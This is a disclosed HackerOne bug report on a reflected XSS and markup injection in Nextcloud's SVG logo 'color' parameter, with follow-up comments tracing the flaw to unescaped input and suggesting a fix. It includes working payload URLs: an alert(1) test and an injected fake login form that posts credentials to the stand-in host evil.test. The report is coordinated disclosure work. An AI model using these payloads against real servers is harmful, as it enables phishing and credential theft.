{"id":605915,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MDU5MTU=","url":"https://hackerone.com/reports/605915","title":"Reflected XSS / Markup Injection in `index.php/svg/core/logo/logo` parameter `color`","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-06-11T12:15:58.642Z","submitted_at":"2019-06-11T12:15:58.642Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"freddyb","url":"/freddyb","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/005/953/99768f6b0690c2f5cb0bf55bea826960f8176e45_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13291,"url":"https://hackerone.com/nextcloud","handle":"nextcloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Nextcloud","twitter_handle":"nextclouders","website":"https://nextcloud.com","about":"Access, share and protect your files, calendars, contacts, communication \u0026 more at home and in your enterprise."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8120"],"singular_disclosure_disabled":false,"disclosed_at":"2019-08-29T20:01:03.747Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-07-30T20:01:03.012Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I just found a reflected Cross-Site Scripting (XSS) vulnerability in Nextcloud Server that affects current stable and dates back to at least 15.0.5.\nThe vulnerability seems mitigated by a Content-Security-Policy (CSP), but there might be a residual risk for phishing, due to the CSP's lack of a `form-action` directive.\n\nSteps to repeat (for basic XSS):\n0) Replace server.test in the following URLs with your own test instance of Nextcloud.\n1) Open Developer Tools (alternatively, disable CSP in your browser :-))\n2) go to https://server.test/nextcloud/index.php/svg/core/logo/logo?color=f00%22/%3E%3Cg%20onload=%22javascript:alert(1)%22%3E%3C/g%3E%3Ccircle%20alt=%22meh\n3) Observe the CSP violation (alternatively, the alert popup)\n\nSteps to repeat for phishing\n0) Replace server.test in the following URLS with your own test instance of Nextcloud.\n1) Visit https://server.test/nextcloud/index.php/svg/core/logo/logo?color=fff%22/%3E%3CforeignObject%20class=%22node%22%20x=%220%22%20y=%220%22%20width=%22600%22%20height=%22600%22%3E%3Cdiv%20xmlns=%22http://www.w3.org/1999/xhtml%22%3E%3Cp%3ELogin%3C/p%3E%3Cform%20action=%22//evil.test%22%3E%3Cinput%20placeholder=%22Username%22%20type=%22text%22/%3E%3Cbr/%3E%20%3Cinput%20placeholder=%22Password%22%20type=%22text%22%20/%3E%3Cbr/%3E%3Cinput%20type=%22submit%22%20value=%22Login%22%20/%3E%3C/form%3E%3C/div%3E%3C/foreignObject%3E%3Ccircle%20alt=%22\n1a) For improved readability, here's the resulting SVG source code\n```html\n\u003csvg width=\"256\" height=\"128\" version=\"1.1\" viewBox=\"0 0 256 128\" xmlns=\"http://www.w3.org/2000/svg\"\u003e\u003cg fill=\"none\" stroke-width=\"22\"\u003e\u003ccircle cx=\"40\" cy=\"64\" r=\"26\" stroke=\"#fff\"/\u003e\u003cforeignObject class=\"node\" x=\"0\" y=\"0\" width=\"600\" height=\"600\"\u003e\u003cdiv xmlns=\"http://www.w3.org/1999/xhtml\"\u003e\u003cp\u003eLogin\u003c/p\u003e\u003cform action=\"//evil.test\"\u003e\u003cinput placeholder=\"Username\" type=\"text\"/\u003e\u003cbr/\u003e \u003cinput placeholder=\"Password\" type=\"text\" /\u003e\u003cbr/\u003e\u003cinput type=\"submit\" value=\"Login\" /\u003e\u003c/form\u003e\u003c/div\u003e\u003c/foreignObject\u003e\u003ccircle alt=\"\" fill=\"none\"/\u003e\u003ccircle cx=\"216\" cy=\"64\" r=\"26\" stroke=\"#fff\"/\u003e\u003cforeignObject class=\"node\" x=\"0\" y=\"0\" width=\"600\" height=\"600\"\u003e\u003cdiv xmlns=\"http://www.w3.org/1999/xhtml\"\u003e\u003cp\u003eLogin\u003c/p\u003e\u003cform action=\"//evil.test\"\u003e\u003cinput placeholder=\"Username\" type=\"text\"/\u003e\u003cbr/\u003e \u003cinput placeholder=\"Password\" type=\"text\" /\u003e\u003cbr/\u003e\u003cinput type=\"submit\" value=\"Login\" /\u003e\u003c/form\u003e\u003c/div\u003e\u003c/foreignObject\u003e\u003ccircle alt=\"\" fill=\"none\"/\u003e\u003ccircle cx=\"128\" cy=\"64\" r=\"46\" stroke=\"#fff\"/\u003e\u003cforeignObject class=\"node\" x=\"0\" y=\"0\" width=\"600\" height=\"600\"\u003e\u003cdiv xmlns=\"http://www.w3.org/1999/xhtml\"\u003e\u003cp\u003eLogin\u003c/p\u003e\u003cform action=\"//evil.test\"\u003e\u003cinput placeholder=\"Username\" type=\"text\"/\u003e\u003cbr/\u003e \u003cinput placeholder=\"Password\" type=\"text\" /\u003e\u003cbr/\u003e\u003cinput type=\"submit\" value=\"Login\" /\u003e\u003c/form\u003e\u003c/div\u003e\u003c/foreignObject\u003e\u003ccircle alt=\"\" fill=\"none\"/\u003e\u003c/g\u003e\u003c/svg\u003e\n\n```\n2) Observe how we injected a login form that points to https://evil.test. Note that further styling using CSS files of the currently applied theme could be used to make the attack more convincing. Additionally, an attacker might put the Nextcloud instance into an iframe, to hide the injection from the address bar (depending on X-Frame-Options header).\n\n## Impact\n\n- Phishing\n- XSS on the nextcloud instance, if the CSP is bypassed (rather unlikely)","vulnerability_information_html":"\u003cp\u003eI just found a reflected Cross-Site Scripting (XSS) vulnerability in Nextcloud Server that affects current stable and dates back to at least 15.0.5.\u003cbr\u003e\nThe vulnerability seems mitigated by a Content-Security-Policy (CSP), but there might be a residual risk for phishing, due to the CSP\u0026#39;s lack of a \u003ccode\u003eform-action\u003c/code\u003e directive.\u003c/p\u003e\n\n\u003cp\u003eSteps to repeat (for basic XSS):\u003cbr\u003e\n0) Replace server.test in the following URLs with your own test instance of Nextcloud.\u003cbr\u003e\n1) Open Developer Tools (alternatively, disable CSP in your browser :-))\u003cbr\u003e\n2) go to \u003ca title=\"https://server.test/nextcloud/index.php/svg/core/logo/logo?color=f00%22/%3E%3Cg%20onload=%22javascript:alert(1)%22%3E%3C/g%3E%3Ccircle%20alt=%22meh\" href=\"/redirect?url=https%3A%2F%2Fserver.test%2Fnextcloud%2Findex.php%2Fsvg%2Fcore%2Flogo%2Flogo%3Fcolor%3Df00%2522%2F%253E%253Cg%2520onload%3D%2522javascript%3Aalert%281%29%2522%253E%253C%2Fg%253E%253Ccircle%2520alt%3D%2522meh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://server.test/nextcloud/index.php/svg/core/logo/logo?color=f00%22/%3E%3Cg%20onload=%22javascript:alert(1)%22%3E%3C/g%3E%3Ccircle%20alt=%22meh\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n3) Observe the CSP violation (alternatively, the alert popup)\u003c/p\u003e\n\n\u003cp\u003eSteps to repeat for phishing\u003cbr\u003e\n0) Replace server.test in the following URLS with your own test instance of Nextcloud.\u003cbr\u003e\n1) Visit \u003ca title=\"https://server.test/nextcloud/index.php/svg/core/logo/logo?color=fff%22/%3E%3CforeignObject%20class=%22node%22%20x=%220%22%20y=%220%22%20width=%22600%22%20height=%22600%22%3E%3Cdiv%20xmlns=%22http://www.w3.org/1999/xhtml%22%3E%3Cp%3ELogin%3C/p%3E%3Cform%20action=%22//evil.test%22%3E%3Cinput%20placeholder=%22Username%22%20type=%22text%22/%3E%3Cbr/%3E%20%3Cinput%20placeholder=%22Password%22%20type=%22text%22%20/%3E%3Cbr/%3E%3Cinput%20type=%22submit%22%20value=%22Login%22%20/%3E%3C/form%3E%3C/div%3E%3C/foreignObject%3E%3Ccircle%20alt=%22\" href=\"/redirect?url=https%3A%2F%2Fserver.test%2Fnextcloud%2Findex.php%2Fsvg%2Fcore%2Flogo%2Flogo%3Fcolor%3Dfff%2522%2F%253E%253CforeignObject%2520class%3D%2522node%2522%2520x%3D%25220%2522%2520y%3D%25220%2522%2520width%3D%2522600%2522%2520height%3D%2522600%2522%253E%253Cdiv%2520xmlns%3D%2522http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%2522%253E%253Cp%253ELogin%253C%2Fp%253E%253Cform%2520action%3D%2522%2F%2Fevil.test%2522%253E%253Cinput%2520placeholder%3D%2522Username%2522%2520type%3D%2522text%2522%2F%253E%253Cbr%2F%253E%2520%253Cinput%2520placeholder%3D%2522Password%2522%2520type%3D%2522text%2522%2520%2F%253E%253Cbr%2F%253E%253Cinput%2520type%3D%2522submit%2522%2520value%3D%2522Login%2522%2520%2F%253E%253C%2Fform%253E%253C%2Fdiv%253E%253C%2FforeignObject%253E%253Ccircle%2520alt%3D%2522\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://server.test/nextcloud/index.php/svg/core/logo/logo?color=fff%22/%3E%3CforeignObject%20class=%22node%22%20x=%220%22%20y=%220%22%20width=%22600%22%20height=%22600%22%3E%3Cdiv%20xmlns=%22http://www.w3.org/1999/xhtml%22%3E%3Cp%3ELogin%3C/p%3E%3Cform%20action=%22//evil.test%22%3E%3Cinput%20placeholder=%22Username%22%20type=%22text%22/%3E%3Cbr/%3E%20%3Cinput%20placeholder=%22Password%22%20type=%22text%22%20/%3E%3Cbr/%3E%3Cinput%20type=%22submit%22%20value=%22Login%22%20/%3E%3C/form%3E%3C/div%3E%3C/foreignObject%3E%3Ccircle%20alt=%22\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n1a) For improved readability, here\u0026#39;s the resulting SVG source code\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;svg\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;256\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;128\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eversion=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1.1\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eviewBox=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0 0 256 128\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;g\u003c/span\u003e \u003cspan class=\"na\"\u003efill=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;none\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003estroke-width=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;22\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;circle\u003c/span\u003e \u003cspan class=\"na\"\u003ecx=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;40\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ecy=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;64\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003er=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;26\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003estroke=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;#fff\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u0026lt;foreignObject\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;node\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;600\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;600\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/1999/xhtml\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;p\u0026gt;\u003c/span\u003eLogin\u003cspan class=\"nt\"\u003e\u0026lt;/p\u0026gt;\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;//evil.test\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003eplaceholder=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Username\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u0026lt;br/\u0026gt;\u003c/span\u003e \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003eplaceholder=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Password\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u0026lt;br/\u0026gt;\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Login\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/foreignObject\u0026gt;\u0026lt;circle\u003c/span\u003e \u003cspan class=\"na\"\u003ealt=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003efill=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;none\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u0026lt;circle\u003c/span\u003e \u003cspan class=\"na\"\u003ecx=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;216\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ecy=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;64\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003er=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;26\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003estroke=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;#fff\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u0026lt;foreignObject\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;node\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;600\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;600\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/1999/xhtml\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;p\u0026gt;\u003c/span\u003eLogin\u003cspan class=\"nt\"\u003e\u0026lt;/p\u0026gt;\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;//evil.test\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003eplaceholder=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Username\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u0026lt;br/\u0026gt;\u003c/span\u003e \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003eplaceholder=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Password\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u0026lt;br/\u0026gt;\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Login\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/foreignObject\u0026gt;\u0026lt;circle\u003c/span\u003e \u003cspan class=\"na\"\u003ealt=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003efill=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;none\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u0026lt;circle\u003c/span\u003e \u003cspan class=\"na\"\u003ecx=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;128\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ecy=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;64\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003er=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;46\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003estroke=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;#fff\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u0026lt;foreignObject\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;node\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;600\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;600\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/1999/xhtml\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;p\u0026gt;\u003c/span\u003eLogin\u003cspan class=\"nt\"\u003e\u0026lt;/p\u0026gt;\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;//evil.test\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003eplaceholder=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Username\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u0026lt;br/\u0026gt;\u003c/span\u003e \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003eplaceholder=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Password\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u0026lt;br/\u0026gt;\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Login\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/foreignObject\u0026gt;\u0026lt;circle\u003c/span\u003e \u003cspan class=\"na\"\u003ealt=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003efill=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;none\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u0026lt;/g\u0026gt;\u0026lt;/svg\u0026gt;\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e2) Observe how we injected a login form that points to \u003ca title=\"https://evil.test\" href=\"/redirect?url=https%3A%2F%2Fevil.test\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://evil.test\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Note that further styling using CSS files of the currently applied theme could be used to make the attack more convincing. Additionally, an attacker might put the Nextcloud instance into an iframe, to hide the injection from the address bar (depending on X-Frame-Options header).\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003ePhishing\u003c/li\u003e\n\u003cli\u003eXSS on the nextcloud instance, if the CSP is bypassed (rather unlikely)\u003c/li\u003e\n\u003c/ul\u003e\n","bounty_amount":"50.0","formatted_bounty":"$50","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-08-29T20:01:03.263Z","allow_singular_disclosure_after":-42114540.1401789,"singular_disclosure_allowed":true,"vote_count":17,"voters":["secator","sameerphad72","cr4xerbik4sh","s3ntago","monochrome","tems","cryptographer","armansameer","homosapien","woko_collins-77","and 7 more..."],"severity":{"rating":"medium","score":6.5,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":13,"asset_type":"SOURCE_CODE","asset_identifier":"nextcloud/server","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5048493,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us!\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we\u0026#39;d like to ask you to not disclose this issue to any other party.\u003c/p\u003e\n","automated_response":true,"created_at":"2019-06-11T12:15:58.965Z","updated_at":"2019-06-11T12:15:58.965Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5065339,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e   Note that further styling using CSS files of the currently applied theme could be used to make the attack more convincing. Additionally, an attacker might put the Nextcloud instance into an iframe, to hide the injection from the address bar (depending on X-Frame-Options header).\n\nI just noticed the CSP's `style-src` directive allows 'unsafe-inline', so the phishing vector could be styled arbitrarily.","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eNote that further styling using CSS files of the currently applied theme could be used to make the attack more convincing. Additionally, an attacker might put the Nextcloud instance into an iframe, to hide the injection from the address bar (depending on X-Frame-Options header).\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eI just noticed the CSP\u0026#39;s \u003ccode\u003estyle-src\u003c/code\u003e directive allows \u0026#39;unsafe-inline\u0026#39;, so the phishing vector could be styled arbitrarily.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T12:38:47.036Z","updated_at":"2019-06-12T12:38:47.036Z","actor":{"username":"freddyb","cleared":false,"url":"/freddyb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/953/99768f6b0690c2f5cb0bf55bea826960f8176e45_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5065406,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I finally got the time to dig into the source code.\n\nThe injection happens in the [`colorizeSvg` function in IconsCacher.php in (line 186, permalink](https://github.com/nextcloud/server/blob/c352bb5416d28c05ca11c3a22c093b66bddc61a1/lib/private/Template/IconsCacher.php#L186)), as the color value is neither being validated nor escaped. The color comes from [SvgController.php `getSvg()` function (line 127, permalink](https://github.com/nextcloud/server/blob/6ad7f329385f73a731f69d9f00cf5b038f3eac04/core/Controller/SvgController.php#L127)).\n\nI haven't dug deep enough to see whether Nextcloud server usually escapes in the sources or in the sink, so depending on other callers of `colorizeSvg`, you might just add a regex filter that limits colors to a regular expression of `[0-9a-f]{1,6} ` at the very beginning of the function.","markdown_message":"\u003cp\u003eI finally got the time to dig into the source code.\u003c/p\u003e\n\n\u003cp\u003eThe injection happens in the \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fserver%2Fblob%2Fc352bb5416d28c05ca11c3a22c093b66bddc61a1%2Flib%2Fprivate%2FTemplate%2FIconsCacher.php%23L186\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e\u003ccode\u003ecolorizeSvg\u003c/code\u003e function in IconsCacher.php in (line 186, permalink\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e), as the color value is neither being validated nor escaped. The color comes from \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fserver%2Fblob%2F6ad7f329385f73a731f69d9f00cf5b038f3eac04%2Fcore%2FController%2FSvgController.php%23L127\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSvgController.php \u003ccode\u003egetSvg()\u003c/code\u003e function (line 127, permalink\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e).\u003c/p\u003e\n\n\u003cp\u003eI haven\u0026#39;t dug deep enough to see whether Nextcloud server usually escapes in the sources or in the sink, so depending on other callers of \u003ccode\u003ecolorizeSvg\u003c/code\u003e, you might just add a regex filter that limits colors to a regular expression of 